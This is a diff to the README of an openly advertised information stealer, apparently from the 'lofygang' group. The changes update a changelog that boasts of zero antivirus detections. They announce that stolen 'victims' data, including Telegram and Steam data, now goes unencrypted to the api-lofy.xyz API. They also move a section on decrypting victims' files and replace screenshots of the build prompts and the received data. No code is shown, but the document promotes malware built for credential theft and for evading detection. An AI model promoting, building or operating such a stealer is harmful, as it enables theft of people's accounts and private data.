@@ -1,5 +1,5 @@
 <p align="center">
-  <img src="https://cdn.discordapp.com/emojis/1223863346512531558.webp?size=96&quality=lossless" width="100" height="auto">
+  <img src="https://cdn.discordapp.com/emojis/834125503333400656.webp?size=96&quality=lossless" width="100" height="auto">
   <br>
   <a href="https://t.me/lofygang">Telegram Group</a>
 </p>
@@ -18,12 +18,17 @@
 
 > (17/08/2024) I made some changes to the stealer to get telegram/Steam and some performance tweaks.
 
+> (06/09/2024) Removal of encryption and a minor adjustment in the build.
+
 ---
 
 ### Detection
 
 * (01/08/2024) At the moment there are no virus detections or false positives.
 * (17/08/2024) No detection yet.
+* (06/09/2024) Still nothing.
+
+<img src="https://cdn.discordapp.com/attachments/1253735527606259773/1281767293944205322/image.png?ex=66dcea50&is=66db98d0&hm=265084d3b279553d1613eafc36b1c4f0864f6acc01494e2ad77b55d1c8ec1e6b&" width="auto" height="auto">
 
 ---
 
@@ -48,9 +53,15 @@
 * ✅ You can change the data in the executable description.
 * ✅ The information arrives like this:
 
-<img src="https://cdn.discordapp.com/attachments/1274362239402508320/1274563851672752158/image.png?ex=66c2b596&is=66c16416&hm=fa7cc49d00cc8cbf2c6f8f98642fc14c2707f71d55e9f3258e014122b18571fd&" width="auto" height="auto">
+<img src="https://cdn.discordapp.com/attachments/1268535291929563200/1281759663553122406/image.png?ex=66dce335&is=66db91b5&hm=21a392916f8b9b61df491091865b4ca2e9b1f1830fe77d60931c70b07ab87e37&" width="auto" height="auto">
 
 ---
+
+### Decrypt Victims Files
+
+* In the previous version, the victims' data were encrypted before being sent to the [api-lofy.xyz](https://api-lofy.xyz) API, and a decryption password was sent via webhook. However, due to recurring issues with data recovery even with the correct password, we have decided to simplify the process.
+
+* Now, the data will be sent directly to the API without additional encryption. If you are not comfortable with this change and prefer to keep the data secure, we recommend not using the code. We understand the concerns about privacy and will continue to look for alternatives to ensure data protection.
 
 ### Installation
 
@@ -61,18 +72,7 @@
 * 3- After opening it, just keep filling in the questions.
 
 <p align="center">
-  <img src="https://media.discordapp.net/attachments/1274362239402508320/1274565324456591370/image.png?ex=66c2b6f5&is=66c16575&hm=98d9370d85ae29eef85fa8ee19f3c89cc098f0de91903d3a269608a841205e9e&=&format=webp&quality=lossless&width=1200&height=676" width="auto" height="auto">
-</p>
-
----
-
-### Decrypt Victims Files
-
-* The victims' files are sent to the [api-lofy.xyz](https://api-lofy.xyz) API, but rest assured, the contents are encrypted to ensure privacy. To decrypt, use `node decrypt.js` and follow the prompts. 
-* I can't remove this feature as it ensures the privacy of the data sent to the API. However, if you prefer, you can remove it yourself.
-
-<p align="center">
-  <img src="https://cdn.discordapp.com/attachments/1274362239402508320/1274592337594683535/image.png?ex=66c2d01e&is=66c17e9e&hm=fe2d99521bdf1e4d728ca9c2b129fa68ad5af9aac0b130f6090d41e28244f59b&"  width="auto" height="auto">
+  <img src="https://cdn.discordapp.com/attachments/1268535291929563200/1281758353865052212/image.png?ex=66dce1fd&is=66db907d&hm=560408843c7adb0eab4d13ae3cbe8caaabbb3d9739afd3d9ef8c3a7af8ed7f69&" width="auto" height="auto">
 </p>
 
 ---
